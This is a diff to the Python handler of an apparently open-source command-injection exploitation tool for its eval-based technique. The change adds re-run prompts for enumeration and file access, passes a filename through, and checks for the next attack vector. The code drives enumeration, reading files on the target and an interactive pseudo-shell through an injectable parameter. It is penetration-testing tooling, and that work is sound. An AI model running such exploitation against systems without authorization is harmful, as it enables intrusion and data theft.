@@ -29,6 +29,7 @@ from src.utils import settings
 
 from src.thirdparty.colorama import Fore, Back, Style, init
 
+from src.core.injections.controller import checks
 from src.core.requests import headers
 from src.core.requests import parameters
 
@@ -196,7 +197,7 @@ def eb_injection_handler(url, delay, filename, http_request_method):
             export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)
           if vp_flag == True:
             vp_flag = logs.add_parameter(vp_flag, filename, http_request_method, vuln_parameter, payload)
-          logs.upload_payload(filename, counter, payload) 
+          logs.update_payload(filename, counter, payload) 
           counter = counter + 1
           
           # Print the findings to terminal.
@@ -206,21 +207,56 @@ def eb_injection_handler(url, delay, filename, http_request_method):
           print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload) + Style.RESET_ALL
 
           # Check for any enumeration options.
-          eb_enumeration.do_check(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter)
+          if settings.ENUMERATION_DONE == True :
+            while True:
+              enumerate_again = raw_input("\n(?) Do you want to enumerate again? [Y/n/q] > ").lower()
+              if enumerate_again in settings.CHOISE_YES:
+                eb_enumeration.do_check(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, filename)
+                break
+              elif enumerate_again in settings.CHOISE_NO: 
+                break
+              elif enumerate_again in settings.CHOISE_QUIT:
+                sys.exit(0)
+              else:
+                if enumerate_again == "":
+                  enumerate_again = "enter"
+                print Back.RED + "(x) Error: '" + enumerate_again + "' is not a valid answer." + Style.RESET_ALL
+                pass
+
+          else:
+            eb_enumeration.do_check(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, filename)
 
           # Check for any system file access options.
-          eb_file_access.do_check(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter)
+          if settings.FILE_ACCESS_DONE == True :
+            while True:
+              file_access_again = raw_input("(?) Do you want to access files again? [Y/n/q] > ").lower()
+              if file_access_again in settings.CHOISE_YES:
+                if not menu.options.verbose:
+                  print ""
+                eb_file_access.do_check(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, filename)
+                break
+              elif file_access_again in settings.CHOISE_NO: 
+                break
+              elif file_access_again in settings.CHOISE_QUIT:
+                sys.exit(0)
+              else:
+                if file_access_again  == "":
+                  file_access_again  = "enter"
+                print Back.RED + "(x) Error: '" + file_access_again  + "' is not a valid answer." + Style.RESET_ALL
+                pass
+          else:
+            eb_file_access.do_check(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, filename)
 
           # Check if defined single cmd.
           if menu.options.os_cmd:
-            eb_enumeration.single_os_cmd_exec(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter)
+            eb_enumeration.single_os_cmd_exec(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, filename)
 
           # Pseudo-Terminal shell
           go_back = False
           while True:
             if go_back == True:
               break
-            gotshell = raw_input("\n(?) Do you want a Pseudo-Terminal shell? [Y/n/q] > ").lower()
+            gotshell = raw_input("(?) Do you want a Pseudo-Terminal shell? [Y/n/q] > ").lower()
             if gotshell in settings.CHOISE_YES:
               print ""
               print "Pseudo-Terminal (type '?' for shell options)"
@@ -234,14 +270,19 @@ def eb_injection_handler(url, delay, filename, http_request_method):
                       sys.exit(0)
                     elif cmd.lower() == "back":
                       go_back = True
-                      break
+                      if checks.check_next_attack_vector(technique, go_back) == True:
+                        break
+                      else:
+                        if no_result == True:
+                          return False 
+                        else:
+                          return True 
                     else:
                       pass
                       
                   else:
-
                     # The main command injection exploitation.
-                    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter)
+                    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, filename)
                           
                     # if need page reload
                     if menu.options.url_reload:
@@ -255,16 +296,19 @@ def eb_injection_handler(url, delay, filename, http_request_method):
                       if shell != "":
                         print "\n" + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL + "\n"
                       else:
-                        print "\n" + Back.RED + "(x) Error: The '" + cmd + "' command, does not return any output." + Style.RESET_ALL + "\n"
+                        print Back.RED + "(x) Error: The '" + cmd + "' command, does not return any output." + Style.RESET_ALL + "\n"
                     
                 except KeyboardInterrupt: 
                   raise
               
             elif gotshell in settings.CHOISE_NO:
-              if menu.options.verbose:
-                sys.stdout.write("\r(*) Continue testing the "+ technique +"... ")
-                sys.stdout.flush()
-              break
+              if checks.check_next_attack_vector(technique, go_back) == True:
+                break
+              else:
+                if no_result == True:
+                  return False 
+                else:
+                  return True  
 
             elif gotshell in settings.CHOISE_QUIT:
               sys.exit(0)
